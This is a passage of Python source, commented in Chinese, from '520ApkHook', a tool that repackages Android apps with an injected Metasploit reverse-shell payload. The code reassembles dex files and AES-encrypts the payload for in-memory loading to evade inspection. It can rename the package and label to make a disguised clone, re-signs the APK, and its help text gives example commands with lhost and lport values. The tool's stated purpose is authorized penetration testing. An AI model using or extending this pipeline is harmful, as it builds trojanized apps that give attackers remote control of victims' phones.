                f"包名已改为 {changes['package_name']['to']}，"
                'dex 内类路径保持原样；如原 App 用自身包名做签名校验/推送注册，需自测')

        if target >= 31 and changes.get('exported_fixed'):
            Print.PrintInfo(f"    补齐 exported 的组件: {len(changes['exported_fixed'])} 个")
        if changes.get('permissions_added'):
            Print.PrintInfo(f"    新增权限: {len(changes['permissions_added'])} 个")
        if changes.get('package_name'):
            Print.PrintInfo(f"    包名: {changes['package_name']['from']} -> "
                            f"{changes['package_name']['to']}")
        if changes.get('label'):
            Print.PrintInfo(f"    显示名: {changes['label']['to']}")
        if changes.get('provider'):
            Print.PrintInfo(f"    provider: {changes['provider']['name']} "
                            f"(authorities={changes['provider']['authorities']})")
        return changes

    # ---------------------------------------------------------------- 回编译
    def Reassemble(self):
        self.DexBuilt = []
        if not self.RebuildAppDex:
            if self.ProviderMode:
                Print.PrintInfo(f'    模式 {self.Args.mode} 不改宿主 dex：'
                                '只编译 payload/provider 那个 dex')
                built = self.Paths['built']
                os.makedirs(built, exist_ok=True)
                out = os.path.join(built, 'payload.dex')
                Tools.smali2dex(self.Paths['payload_smali'], out, java=self.JavaPath)
                if not os.path.isfile(out):
                    raise ToolError(f'smali 回编译产物缺失: {out}')
                self.DexBuilt.append(('payload', out))
                self.Report['built_dexes'] = [
                    {'kind': 'payload', 'file': os.path.basename(out),
                     'size': os.path.getsize(out)}]
                Print.PrintInfo(f'    payload -> {os.path.basename(out)} '
                                f'({os.path.getsize(out)} B)')
                if self.EncryptPayload:
                    # 模式 6：provider/loader/probe 单独编一个明文 dex
                    wr_out = os.path.join(built, 'wrapper.dex')
                    Tools.smali2dex(self.Paths['wrapper_smali'], wr_out,
                                    java=self.JavaPath)
                    if not os.path.isfile(wr_out):
                        raise ToolError(f'smali 回编译产物缺失: {wr_out}')
                    self.DexBuilt.append(('wrapper', wr_out))
                    self.Report['built_dexes'].append(
                        {'kind': 'wrapper', 'file': os.path.basename(wr_out),
                         'size': os.path.getsize(wr_out)})
                    Print.PrintInfo(f'    wrapper -> {os.path.basename(wr_out)} '
                                    f'({os.path.getsize(wr_out)} B)')
                return self.DexBuilt
            if self.WantPayload and os.path.isdir(self.Paths['payload_smali']):
                built = self.Paths['built']
                os.makedirs(built, exist_ok=True)
                out = os.path.join(built, 'payload.dex')
                Tools.smali2dex(self.Paths['payload_smali'], out, java=self.JavaPath)
                if not os.path.isfile(out):
                    raise ToolError(f'smali 回编译产物缺失: {out}')
                self.DexBuilt.append(('payload', out))
                self.Report['built_dexes'] = [
                    {'kind': 'payload', 'file': os.path.basename(out),
                     'size': os.path.getsize(out)}]
                Print.PrintInfo(f'    payload -> {os.path.basename(out)} '
                                f'({os.path.getsize(out)} B)')
                if self.KeepInfo:
                    wr_out = os.path.join(built, 'wrapper.dex')
                    Tools.smali2dex(self.Paths['wrapper_smali'], wr_out,
                                    java=self.JavaPath)
                    if not os.path.isfile(wr_out):
                        raise ToolError(f'smali 回编译产物缺失: {wr_out}')
                    self.DexBuilt.append(('wrapper', wr_out))
                    self.Report['built_dexes'].append(
                        {'kind': 'wrapper', 'file': os.path.basename(wr_out),
                         'size': os.path.getsize(wr_out)})
                    Print.PrintInfo(f'    wrapper -> {os.path.basename(wr_out)} '
                                    f'({os.path.getsize(wr_out)} B)')
                return self.DexBuilt
            Print.PrintInfo(f'    模式 {self.Args.mode} 不改 dex，跳过回编译')
            return []
        appdir = self.Paths['smali']
        dirs = [d for d in os.listdir(appdir) if os.path.isdir(os.path.join(appdir, d))]
        dirs.sort(key=lambda d: (MultiDex.parse_dex_name(d + '.dex') is None,
                                 MultiDex.parse_dex_name(d + '.dex') or 0, d))
        if not dirs:
            self.Fail('没有可回编译的 smali 目录')

        built = self.Paths['built']
        jobs = []
        for name in dirs:
            jobs.append({'kind': 'app', 'src': os.path.join(appdir, name),
                         'out': os.path.join(built, f'app_{name}.dex'),
                         'label': name})
        if self.WantPayload and os.path.isdir(self.Paths['payload_smali']):
            jobs.append({'kind': 'payload', 'src': self.Paths['payload_smali'],
                         'out': os.path.join(built, 'payload.dex'),
                         'label': 'payload'})

        def work(job):
            Tools.smali2dex(job['src'], job['out'], java=self.JavaPath)
            if not os.path.isfile(job['out']):
                raise ToolError(f"smali 回编译产物缺失: {job['out']}")
            return job

        done = self.Parallel(work, jobs)
        for job in done:
            # app dex 不进 DexBuilt：LayoutDex 会按槽位用 built/app_<stem>.dex
            # 替换原 dex，重复登记会导致同名 dex 摆两次、dex 数量对不上。
            if job['kind'] != 'app':
                self.DexBuilt.append((job['kind'], job['out']))
            Print.PrintInfo(f"    {job['label']} -> {os.path.basename(job['out'])} "
                            f"({os.path.getsize(job['out'])} B)")

        self.Report['built_dexes'] = [
            {'kind': kind, 'file': os.path.basename(path), 'size': os.path.getsize(path)}
            for kind, path in self.DexBuilt
        ]
        return self.DexBuilt

    # ---------------------------------------------------------------- 摆 dex
    def LayoutDex(self):
        apkdir = self.Paths['apkdir']
        if self.BuildOnly:
            Print.PrintInfo('    模式 4 保留原始 dex 不变')
            self.Report['dex_layout'] = {'placed': [], 'final': MultiDex.summary(apkdir)}
            return []

        if self.EncryptPayload:
            # 模式 6：宿主 dex 原地不动；wrapper（provider/loader/probe）作为
            # 明文 classesN.dex 追加；payload 本体 AES 加密进 assets。
            # 运行时由 provider → Loader 用 InMemoryDexClassLoader 装进内存。
            encdir = os.path.join(apkdir, 'assets', 'apkhook')
            os.makedirs(encdir, exist_ok=True)
            encryptor = EncryptFile(self.Options)
            placed = []
            slot = MultiDex.next_slot(apkdir)
            for kind, path in self.DexBuilt:
                if kind == 'payload':
                    dst = os.path.join(encdir, 'payload.bin')
                    tmp = dst + '.plain'
                    FsSafe.copyfile(path, tmp)
                    try:
                        encryptor.EnCryptDexFile(olddexfile=tmp, newdexfile=dst)
                    finally:
                        if os.path.exists(tmp):
                            os.remove(tmp)
                    rel = os.path.relpath(dst, apkdir).replace(os.sep, '/')
                    placed.append({'slot': -1, 'name': rel, 'kind': kind,
                                   'size': os.path.getsize(dst), 'encrypted': True})
                    Print.PrintInfo(f'    {rel} <- {kind} (AES 加密，运行时内存加载)')
                    continue
                name = MultiDex.dex_name(slot)
                dst = os.path.join(apkdir, name)
                FsSafe.copyfile(path, dst)
                placed.append({'slot': slot, 'name': name, 'kind': kind,
                               'size': os.path.getsize(dst), 'encrypted': False})
                Print.PrintInfo(f'    {name} <- {kind} (明文，追加)')
                slot += 1
            self.Report['dex_layout'] = {
                'strategy': 'assets-encrypted-payload',
                'placed': placed,
                'final': MultiDex.summary(apkdir),
            }
            return placed

        if self.ProviderMode:
            # 模式 5：只在原有 dex 之后追加一个 payload dex，其余一律不动
            slot = MultiDex.next_slot(apkdir)
            placed = []
            for kind, path in self.DexBuilt:
                name = MultiDex.dex_name(slot)
                FsSafe.copyfile(path, os.path.join(apkdir, name))
                placed.append({'slot': slot, 'name': name, 'kind': kind,
                               'size': os.path.getsize(os.path.join(apkdir, name)),
                               'encrypted': False})
                Print.PrintInfo(f'    {name} <- {kind} (明文，追加)')
                slot += 1
            self.Report['dex_layout'] = {
                'strategy': 'append',
                'placed': placed,
                'final': MultiDex.summary(apkdir),
            }
            return placed

        # 先把宿主 dex 原样备份：strip_all 会把它们从 apkdir 里清掉，
        # 而模式 1/3 压根没重新编译 dex，后面要用备份的原始文件摆回去。
        host_orig = self.Paths['host_orig']
        os.makedirs(host_orig, exist_ok=True)
        host = []
        for _slot, dexname in MultiDex.scan(apkdir):
            stem = os.path.splitext(dexname)[0]
            keep = os.path.join(host_orig, dexname)
            if not os.path.isfile(keep):
                FsSafe.copyfile(os.path.join(apkdir, dexname), keep)
            built_one = os.path.join(self.Paths['built'], f'app_{stem}.dex')
            # 只有被注入过的那一个 dex 用回编译产物，其余用原始字节
            host.append(('app', built_one if os.path.isfile(built_one) else keep))

        removed = MultiDex.strip_all(apkdir)
        encryptor = EncryptFile(self.Options)
        placed = []

        if self.WantShell:
            shell = Tools.resolve(self.Options['SteadyDexFile'])
            if not os.path.isfile(shell):
                self.Fail(f'壳 dex 不存在: {shell}')
            shell_name = MultiDex.install_shell(apkdir, shell)
            placed.append({'slot': 0, 'name': shell_name, 'kind': 'shell',
                           'size': os.path.getsize(os.path.join(apkdir, shell_name)),
                           'encrypted': False})
            slot = 1
        else:
            slot = 0

        encrypt_mode = self.EncryptDex

        # 关键：加密后的 dex 绝不能叫 classesN.dex 放在 APK 根目录。
        # ART 的 DexFile::OpenZip 会把 zip 里所有 classes*.dex 一次性打开，
        # 其中任何一个不是合法 dex，整个 PathClassLoader 构造失败 →
        # 进程在跑我们任何一行代码之前就崩掉（打开即闪退）。
        # 所以统一塞进 assets/apkhook/dex/classesN.bin，由壳自己取出来解密。
        encdir = os.path.join(apkdir, 'assets', 'apkhook', 'dex')
        if encrypt_mode:
            os.makedirs(encdir, exist_ok=True)

        def work(item):
            kind, path, index = item
            name = MultiDex.dex_name(index)
            if encrypt_mode:
                dst = os.path.join(encdir, os.path.splitext(name)[0] + '.bin')
                tmp = dst + '.plain'
                FsSafe.copyfile(path, tmp)
                try:
                    encryptor.EnCryptDexFile(olddexfile=tmp, newdexfile=dst)
                finally:
                    if os.path.exists(tmp):
                        os.remove(tmp)
                rel = os.path.relpath(dst, apkdir).replace(os.sep, '/')
            else:
                dst = os.path.join(apkdir, name)
                FsSafe.copyfile(path, dst)
                rel = name
            return {'slot': index, 'name': rel, 'kind': kind,
                    'size': os.path.getsize(dst), 'encrypted': encrypt_mode}

        wrap_path = None
        rest = []
        for kind, path in self.DexBuilt:
            if kind == 'wrapper':
                wrap_path = path
            else:
                rest.append((kind, path))
        items = host + rest
        jobs = [(kind, path, slot + i) for i, (kind, path) in enumerate(items)]
        if encrypt_mode:
            placed.extend(self.Parallel(work, jobs))
        else:
            placed.extend([work(job) for job in jobs])

        if wrap_path:
            name = MultiDex.dex_name(MultiDex.next_slot(apkdir))
            FsSafe.copyfile(wrap_path, os.path.join(apkdir, name))
            placed.append({'slot': -1, 'name': name, 'kind': 'wrapper',
                           'size': os.path.getsize(os.path.join(apkdir, name)),
                           'encrypted': False})
            Print.PrintInfo(f'    {name} <- wrapper (明文，保活服务)')

        self.Report['dex_layout'] = {
            'removed_original': [name for _slot, name in removed],
            'placed': placed,
            'final': MultiDex.summary(apkdir),
        }
        for item in placed:
            flag = '加密' if item['encrypted'] else '明文'
            Print.PrintInfo(f"    {item['name']} <- {item['kind']} ({flag})")
        return placed

    # ------------------------------------------------------------------ so
    def InstallLibs(self):
        apkdir = self.Paths['apkdir']
        shell_lib = Tools.resolve(self.Options['SteadyLibFile'])
        copied = []

        if self.WantShell:
            app_abis = [a for a in DetectAbis(apkdir)]
            if not app_abis:
                app_abis = ['arm64-v8a', 'armeabi-v7a']
                self.Report['warnings'].append(
                    'APK 没有 lib 目录，按 arm64-v8a + armeabi-v7a 补充壳库')
            if 'armeabi' in app_abis and 'armeabi-v7a' not in app_abis:
                app_abis = [a if a != 'armeabi' else 'armeabi-v7a' for a in app_abis]

            for abi in app_abis:
                src = os.path.join(shell_lib, abi, 'libsteady-lib.so')
                if not os.path.isfile(src):
                    self.Report['warnings'].append(f'壳库缺少 ABI {abi}，已跳过')
                    continue
                dst_dir = os.path.join(apkdir, 'lib', abi)
                os.makedirs(dst_dir, exist_ok=True)
                dst = os.path.join(dst_dir, 'libsteady-lib.so')
                FsSafe.copyfile(src, dst)
                copied.append({'abi': abi, 'size': os.path.getsize(dst)})
                Print.PrintInfo(f'    lib/{abi}/libsteady-lib.so ({os.path.getsize(dst)} B)')
        else:
            # 模式 2/4/5 不换壳，不需要 libsteady-lib.so
            app_abis = [a for a in DetectAbis(apkdir)]
            Print.PrintInfo('    不换壳，无需拷贝 libsteady-lib.so')

        align_report = []
        if self.Options['FixAppLibs'] and os.path.isdir(os.path.join(apkdir, 'lib')):
            results = align_dir(os.path.join(apkdir, 'lib'), page_size=PAGE_16K)
            for item in results:
                align_report.append({
                    'file': os.path.relpath(item['path'], apkdir).replace(os.sep, '/'),
                    'changed': item['changed'],
                    'pad': item['pad'],
                    'ok': item['ok'],
                    'errors': item['errors'],
                })
            changed = [r for r in align_report if r['changed']]
            if changed:
                Print.PrintInfo(f'    16KB 重对齐: {len(changed)} 个 .so')

        self.Report['libs'] = {'abis': app_abis, 'shell_copied': copied,
                               'elf_align': align_report}
        return copied

    # ------------------------------------------------------------------ 打包
    def Pack(self):
        page = int(self.Args.page_align or DEFAULT_PAGE_ALIGN)
        zipper = ApkZipper(
            self.Paths['apkdir'], self.Paths['out_apk'],
            page_align=page,
            store_libs=not self.Args.no_store_libs,
        )
        report = zipper.Build()
        self.Report['zip'] = {
            'outpath': report['outpath'],
            'entries': report['entries'],
            'stored': report['stored'],
            'deflated': report['deflated'],
            'size': report['size'],
            'warnings': report['warnings'],
        }
        if report['warnings']:
            self.Report['warnings'].extend(report['warnings'])
        Print.PrintInfo(f"    {report['outpath']} "
                        f"({Tools.human_size(report['size'])}, "
                        f"{report['entries']} entries)")
        return report

    # ------------------------------------------------------------------ 签名
    def Sign(self):
        if self.Args.no_sign:
            self.Report['warnings'].append('已按参数跳过签名，产物不可直接安装')
            return None
        keystore = self.Args.keystore or Tools.resolve(self.Options['Keystorefile'])
        ks_pass = self.Args.ks_pass or self.Options['KeystorePass']
        key_pass = self.Args.key_pass or self.Options['KeyPass']
        min_sdk = self.ManifestInfo['min_sdk'] or 21
        Tools.apksigner_sign(
            self.Paths['out_apk'], keystore, ks_pass, key_pass,
            min_sdk=min_sdk,
            v1=self.Args.v1, v2=self.Args.v2, v3=self.Args.v3,
            java=self.JavaPath,
        )
        self.Report['sign'] = {
            'keystore': os.path.abspath(keystore),
            'v1': self.Args.v1, 'v2': self.Args.v2, 'v3': self.Args.v3,
            'min_sdk': min_sdk,
        }
        Print.PrintInfo(f'    已签名 (v1={self.Args.v1} v2={self.Args.v2} v3={self.Args.v3})')
        return True

    # ------------------------------------------------------------------ 自检
    def SelfCheck(self):
        page = int(self.Args.page_align or DEFAULT_PAGE_ALIGN)
        report = Verify(self.Paths['out_apk'], page_align=page, java=self.JavaPath,
                        check_signature=not self.Args.no_sign)
        self.Report['verify'] = report
        Print.PrintRule('自检结果')
        PrintReport(report, printer=Print.PrintInfo)
        if not report['ok']:
            self.Report['errors'].extend(report['problems'])
        return report

    # ------------------------------------------------------------------ 体检
    def Analyze(self):
        """--analyze：只读体检，不改任何文件，输出 Android 5.0~17 兼容性报告。"""
        page = int(self.Args.page_align or DEFAULT_PAGE_ALIGN)
        report = Verify(self.Args.normal_apk, page_align=page, java=self.JavaPath,
                        check_signature=True)
        self.Report['analyze'] = report
        Print.PrintRule('APK 体检（未做任何修改）')
        PrintReport(report, printer=Print.PrintInfo)

        advice = []
        if not report['alignment'].get('ok', False):
            advice.append('对齐不合规：Android 11+ 可能装不上（resources.arsc 需 STORED+4 字节对齐）')
        if any(not elf.get('ok', True) for elf in report.get('elfs', [])):
            advice.append('存在 4KB 页对齐的 .so：Android 15+ 16KB 页设备会崩，用 -m 4 可自动修')
        if report.get('signature_verified') is False:
            advice.append('签名校验失败或未签名：安装前需重签')
        for item in report.get('android_matrix', []):
            if item.get('state') == 'fail':
                advice.append(item.get('note') or f"Android {item['android']} 不兼容")
        if advice:
            Print.PrintRule('建议')
            Print.PrintInfo('\n'.join('    - ' + line for line in advice))
        else:
            Print.PrintSuccess('    这个包本身已经满足 Android 5.0~17 的安装要求')
        self.Report['analyze_advice'] = advice
        return report

    # ---------------------------------------------------------------- 计划预览
    def Plan(self):
        """--dry-run：解包 + 读清单 + 打印将要执行的改动，不生成 APK。"""
        SafeExtractApk(self.Args.normal_apk, self.Paths['apkdir'])
        manifest = os.path.join(self.Paths['apkdir'], 'AndroidManifest.xml')
        info = ReadInfo(manifest)
        self.ManifestInfo = info
        target = self.Args.target_sdk or max(
            info['target_sdk'] or 0, self.Options['MinInstallableTargetSdk'])
        plan = [
            f"模式            : {self.Args.mode} ({MODES.get(self.Args.mode, '?')})",
            f"包名            : {info['package']}"
            + (f" -> {self.Args.rename_package}" if getattr(self.Args, 'rename_package', None) else ''),
            f"显示名          : {info.get('label') or '(资源引用)'}"
            + (f" -> {self.Args.label}" if getattr(self.Args, 'label', None) else ''),
            f"targetSdk       : {info['target_sdk']} -> {target}",
            f"minSdk          : {info['min_sdk']}"
            + (f" -> {self.Args.min_sdk}" if self.Args.min_sdk else '（不变）'),
            f"Application     : {NormalizeClassName(info['package'], info['application'])}",
            f"启动 Activity   : {NormalizeClassName(info['package'], info['launcher_activity'])}",
            f"dex 数量        : {len(DexSlots(self.Paths['apkdir']))}",
            f"ABI             : {', '.join(DetectAbis(self.Paths['apkdir'])) or '(无 lib 目录)'}",
            f"并发任务数      : {self.Jobs}",
        ]
        if self.WantShell:
            plan.append('壳 Application  : %s（meta-data app_name 保存原 Application）'
                        % self.Options['SteadyLauncherActivity'])
        if self.ProviderMode:
            plan.append('注入方式        : ContentProvider（零改 dex，不换壳，不加密宿主 dex）')
        if self.WantPayload:
            plan.append(f'payload         : {self.Args.payload} '
                        f'{self.Args.lhost}:{self.Args.lport}')
        if self.BuildOnly:
            plan.append('模式 4 只修对齐/targetSdk/exported 并重签，不改 dex 内容')
        Print.PrintRule('执行计划（--dry-run：不改输入文件、不生成 APK）')
        Print.PrintInfo('\n'.join('    ' + line for line in plan))
        self.Report['plan'] = plan
        return plan

    # ------------------------------------------------------------------ 收尾
    def WriteReport(self):
        path = self.Paths['report']
        os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
        self.Report['finished_at'] = time.strftime('%Y-%m-%d %H:%M:%S')
        self.Report['total_seconds'] = round(
            sum(t['seconds'] for t in self.Timings), 2) if self.Timings else 0
        try:
            with open(path, 'w', encoding='utf-8') as fp:
                json.dump(self.Report, fp, ensure_ascii=False, indent=2)
        except OSError as exc:
            Print.PrintError(f'写入 report.json 失败: {exc}')
        return path

    # ------------------------------------------------------------------ 主控
    def Run(self):
        Print.PrintLogo(LOGO)
        Print.PrintRule(f'520ApkHook {VERSION} / {CODENAME}')
        Print.PrintInfo(f'    original by {AUTHOR}; v2.x maintained by {MAINTAINER}')
        help_ = MODE_HELP.get(self.Args.mode, {})
        Print.PrintInfo(f'    mode {self.Args.mode}: {MODES.get(self.Args.mode, "?")}'
                        f'  |  jobs={self.Jobs}')
        if help_:
            Print.PrintInfo(f"    做什么: {help_['do']}")
            Print.PrintInfo(f"    适用机型: {help_['works_on']}"
                            f"  |  需要 --lhost/--lport: "
                            f"{'是' if help_['needs_lport'] else '否'}"
                            f"  |  加密 payload: {'是' if help_['encrypt_payload'] else '否'}")

        if getattr(self.Args, 'analyze', False):
            try:
                self.Step('环境检查', self.CheckEnvironment)
                report = self.Step('APK 体检', self.Analyze)
            except (ToolError, InjectError, ManifestError) as exc:
                self.Fail('体检中断', exc)
                return 1
            self.WriteReport()
            return 0 if report.get('ok') else 2

        if self.WantPayload and not (self.Args.lhost and self.Args.lport):
            self.Fail(f'模式 {self.Args.mode} 需要 --lhost 和 --lport')

        if self.WantShell:
            Print.PrintError(
                '模式 %d 依赖隐藏 API（DexPathList.makePathElements）来加载解密后的宿主 dex，'
                'Android 15 及以上会因 hiddenapi 拦截而加载失败；'
                '在这些机型上请改用 -m 6（零改 dex + 加密 payload + 内存 dex 加载）'
                % self.Args.mode)

        try:
            self.Step('环境检查', self.CheckEnvironment)
            if self.DryRun:
                self.Step('计划预览', self.Plan)
                self.WriteReport()
                Print.PrintRule('dry-run 结束（WorkDir 里只有解包副本，没有生成 APK）')
                return 0
            self.Step('解包 APK', self.Prepare)
            self.Step('模式兼容检查', self.CheckModeCompat)
            if self.WantPayload:
                self.Step('生成 payload', self.BuildMsf)
            if self.NeedAppSmali:
                self.Step('反编译 dex', self.Disassemble)
            if self.WantPayload:
                self.Step('注入 payload', self.InjectPayload)
            self.Step('改写 AndroidManifest', self.PatchManifest)
            if self.NeedAppSmali or self.ProviderMode or self.WantPayload:
                self.Step('回编译 dex', self.Reassemble)
            self.Step('重排 dex', self.LayoutDex)
            self.Step('处理 so', self.InstallLibs)
            self.Step('打包 APK', self.Pack)
            self.Step('签名', self.Sign)
            verify = self.Step('产物自检', self.SelfCheck)
        except (ToolError, InjectError, ManifestError) as exc:
            self.Fail('流程中断', exc)
            return 1
        except FileNotFoundError as exc:
            self.Fail('缺少文件', exc)
            return 1

        report_path = self.WriteReport()
        Print.PrintRule('完成')
        Print.PrintSuccess(f"产物: {self.Paths['out_apk']}")
        if self.Report.get('payload'):
            Print.PrintInfo(f"handler: {self.Paths['handler']}")
            Print.PrintInfo(f"payload: {self.Report['payload']['payload']} "
                            f"{self.Args.lhost}:{self.Args.lport}")
        Print.PrintInfo(f'报告: {report_path}')
        if self.LogPath:
            Print.PrintInfo(f'日志: {self.LogPath}')
        summary = self.Report.get('verify') or {}
        if summary.get('sha256'):
            Print.PrintInfo(f"SHA256: {summary['sha256']}")
        Print.PrintInfo(f"耗时: {self.Report.get('total_seconds', 0):.1f}s "
                        f"(jobs={self.Jobs})")
        Print.PrintInfo(f'{config.PROJECT_URL}  |  {MAINTAINER}')
        if verify.get('ok'):
            Print.PrintSuccess('自检全部通过，可安装到 Android 5.0 ~ 17')
            return 0
        Print.PrintError('自检存在问题，请看 report.json 的 problems 字段')
        return 2


# ==========================================================================
# CLI
# ==========================================================================
def ParseArgs(argv=None):
    parser = argparse.ArgumentParser(
        prog='main.py',
        description=f'520ApkHook {VERSION} —— 支持 Android 5.0~17 的 APK 注入工具'
                    f'（original by {AUTHOR} / maintained by {MAINTAINER}）',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
作者 / Credits:
  原始作者   {AUTHOR}        2021 年初版 520apkhook  {config.UPSTREAM_URL}
  维护者     {MAINTAINER}      Android 11~17 适配 v2.x  {config.PROJECT_URL}
  许可证     {config.LICENSE_NAME}

示例:
  # 加固 + 注入，目标 Android 17 也能跑
  python main.py -n app.apk --lhost 1.2.3.4 --lport 4444 -m 1
  # 只注入 payload，不动原始 dex
  python main.py -n app.apk --lhost 1.2.3.4 --lport 4444 -m 2
  # 只加固（当脱壳/重签工具用）
  python main.py -n app.apk -m 3
  # 只整备：不注入不换壳，只修 Android 17 兼容性并重签
  python main.py -n app.apk -m 4
  # 零改 dex 注入：不换壳、不加密宿主 dex，最不容易把 App 弄崩
  python main.py -n app.apk -m 5 --lhost 1.2.3.4 --lport 4444
  # 先体检，不改文件
  python main.py -n app.apk --analyze
  # 注入 + 马甲包（换包名/显示名）+ 4 并发
  python main.py -n app.apk -m 1 --lhost 1.2.3.4 --lport 4444 \\
      --rename-package com.example.newpkg --label 新名字 --jobs 4
  # 只看计划，不产生 APK
  python main.py -n app.apk -m 1 --lhost h --lport 1 --dry-run
''')
    parser.add_argument('-n', '--normal-apk', default=None, help='目标 APK 路径')
    parser.add_argument('-m', '--mode', type=int, default=1, choices=(1, 2, 3, 4, 5, 6),
                        help='1=加固+注入(默认,仅≤Android14) 2=仅注入 3=仅加固(仅≤Android14) '
                             '4=仅整备(不注入,修兼容性) '
                             '5=零改 dex 注入(provider,明文 payload) '
                             '6=零改 dex + 加密 payload(Android 8.0+,★推荐)  详见 --mode-help')
    parser.add_argument('-p', '--payload', default='android/meterpreter/reverse_tcp',
                        help='msf payload，支持 reverse_tcp / reverse_http / reverse_https')
    parser.add_argument('--lhost', default=None, help='反弹 IP')
    parser.add_argument('--lport', type=int, default=None, help='反弹端口')
    parser.add_argument('-o', '--output', default=None, help='输出 APK 路径')
    parser.add_argument('--min-sdk', type=int, default=None, help='强制设置 minSdkVersion')
    parser.add_argument('--target-sdk', type=int, default=None, help='强制设置 targetSdkVersion')

    # ---- 马甲包 / 清单相关 ----
    parser.add_argument('--rename-package', default=None, metavar='PKG',
                        help='改包名（马甲包）；类名会补全成旧包名绝对名，dex 类路径不变')
    parser.add_argument('--label', default=None, metavar='NAME',
                        help='改应用显示名（写成字面量，不再依赖 @string/app_name）')
    parser.add_argument('--debuggable', action='store_true', help='打开 android:debuggable')
    parser.add_argument('--no-debuggable', dest='no_debuggable', action='store_true',
                        help='关闭 android:debuggable')

    # ---- 打包 / 签名 ----
    parser.add_argument('--page-align', default=None,
                        help='so 对齐字节数，默认 0x4000(16KB)')
    parser.add_argument('--no-store-libs', action='store_true',
                        help='不把 .so 以 STORED 写入（不推荐）')
    parser.add_argument('--no-fix-app-libs', dest='fix_app_libs', action='store_false',
                        help='不修补 App 自带 .so 的 16KB 对齐')
    parser.add_argument('--seed', type=int, default=None, help='payload 混淆随机种子')
    parser.add_argument('--java', default=None, help='java 可执行文件路径')
    parser.add_argument('--keystore', default=None, help='签名证书路径')
    parser.add_argument('--ks-pass', default=None, help='证书口令')
    parser.add_argument('--key-pass', default=None, help='key 口令（默认同 --ks-pass）')
    parser.add_argument('--no-sign', action='store_true', help='跳过签名')
    parser.add_argument('--no-v1', dest='v1', action='store_false', help='关闭 v1 签名')
    parser.add_argument('--no-v2', dest='v2', action='store_false', help='关闭 v2 签名')
    parser.add_argument('--no-v3', dest='v3', action='store_false', help='关闭 v3 签名')

    # ---- 运行控制 ----
    parser.add_argument('--analyze', action='store_true',
                        help='只体检输入 APK（对齐/so/dex/签名/兼容矩阵），不改任何文件')
    parser.add_argument('--dry-run', action='store_true',
                        help='只打印执行计划，不生成 APK')
    parser.add_argument('--jobs', type=int, default=0,
                        help='并发反编译/回编译/加密的线程数（默认 min(4, CPU)）')
    parser.add_argument('--log', default=None, metavar='FILE', help='把完整输出同时写入日志文件')
    parser.add_argument('--quiet', action='store_true', help='只输出成功/错误行')
    parser.add_argument('--no-payload-start', action='store_true',
                        help='（排障）模式 5 只装探针 provider、不启动 payload，'
                             '用来判断闪退是否由 payload 引起')
    parser.add_argument('--keep-workdir', action='store_true',
                        help='保留上次的 WorkDir（默认每次重建）')
    parser.add_argument('--mode-help', action='store_true',
                        help='逐个说明六种模式（做什么/适用机型/优缺点/怎么选）')
    parser.add_argument('--strict-compat', dest='strict_compat', action='store_true',
                        help='模式与目标 APK 不兼容时直接报错，而不是自动降级')
    parser.add_argument('--about', action='store_true', help='打印作者、来源与许可证信息')
    parser.add_argument('-v', '--version', action='version',
                        version=f'520ApkHook {VERSION} ({CODENAME}) - original by {AUTHOR}, '
                                f'maintained by {MAINTAINER}')
    return parser.parse_args(argv)


def PrintModeHelp():
    """--mode-help：把六种模式讲清楚，顺带给出选择建议。"""
    def pad(text, width):
        """按终端显示宽度补空格（中文算 2 列）。"""
        used = sum(2 if ord(ch) > 0x2E80 else 1 for ch in text)
        return text + ' ' * max(0, width - used)

    lines = []
    lines.append('六种模式说明（选不准时按文末「怎么选」走）')
    lines.append('')
    lines.append('  ' + pad('-m', 4) + pad('模式', 44) + pad('换壳', 6)
                 + pad('加密dex', 9) + pad('加密payload', 13) + '适用机型')
    lines.append('  ' + '-' * 90)
    for m in sorted(MODE_HELP):
        h = MODE_HELP[m]
        lines.append('  ' + pad(str(m), 4) + pad(h['title'], 44)
                     + pad('是' if h['shell'] else '否', 6)
                     + pad('是' if h['encrypt_dex'] else '否', 9)
                     + pad('是' if h['encrypt_payload'] else '否', 13)
                     + h['works_on'])
    lines.append('')

    for m in sorted(MODE_HELP):
        h = MODE_HELP[m]
        lines.append('  ── 模式 %d：%s ──' % (m, h['title']))
        lines.append('     做什么    : %s' % h['do'])
        lines.append('     适用机型  : %s（最低 %s）' % (h['works_on'], h['min_android']))
        lines.append('     需要参数  : %s' % ('--lhost 和 --lport' if h['needs_lport']
                                            else '只要 -n 目标.apk'))
        lines.append('     优点      : %s' % h['pro'])
        lines.append('     缺点/限制 : %s' % h['con'])
        lines.append('     什么时候用: %s' % h['use'])
        lines.append('')

    lines.append('  怎么选：')
    lines.append('    新机型（Android 15/16/17）要加密        ->  -m 6   ★推荐')
    lines.append('    老机型（≤ Android 14）要最高强度加固     ->  -m 1')
    lines.append('    只修兼容性、一个字节都不想动业务代码     ->  -m 4')
    lines.append('    要注入但不要求加密                      ->  -m 5')
    lines.append('    只想给 App 加壳 / 只想验证壳链路         ->  -m 3')
    lines.append('    旧系统上做最小改动的注入                 ->  -m 2')
    lines.append('')
    lines.append('  推荐流程：--analyze 体检 -> -m 4 确认重打包没问题 -> -m 6（或 -m 5）注入')
    lines.append('  详情文档：Readme.md 第 1 章')
    Print.PrintInfo('\n'.join(lines))


def PrintAbout():
    """--about：归属信息。"""
    Print.PrintLogo(LOGO)
    Print.PrintRule(f'520ApkHook {VERSION} ({CODENAME})')
    Print.PrintInfo('\n'.join([
        f'原始作者    : {AUTHOR} <{config.AUTHOR_EMAIL}>',
        '              2021 年初版 520apkhook（注入思路 / 壳 dex / jni 库）',
        f'              原项目: {config.UPSTREAM_URL}',
        f'v2.x 维护   : {MAINTAINER} <{config.MAINTAINER_EMAIL}>',
        '              Android 11~17 适配、AxmlEdit/ApkZipper/ElfAlign 重构',
        f'              本项目: {config.PROJECT_URL}',
        f'许可证      : {config.LICENSE_NAME}（沿用原作者许可证）',
        f'版权        : {config.COPYRIGHT}',
        '适用场景    : 已授权的安全测试、渗透演练与教学研究',
    ]))


def main(argv=None):
    args = ParseArgs(argv)
    if args.about:
        PrintAbout()
        return 0
    if getattr(args, 'mode_help', False):
        PrintModeHelp()
        return 0
    if args.page_align:
        try:
            args.page_align = int(str(args.page_align), 0)
        except ValueError:
            sys.stderr.write(f'--page-align 不是合法数字: {args.page_align}\n')
            return 1
    if args.fix_app_libs is False:
        config.OPTIONS['FixAppLibs'] = False
    if not args.normal_apk:
        sys.stderr.write('缺少 -n/--normal-apk（目标 APK 路径）；'
                         '只想看归属信息可用 --about\n')
        return 1
    return Hooker(args).Run()


if __name__ == '__main__':
    raise SystemExit(main())
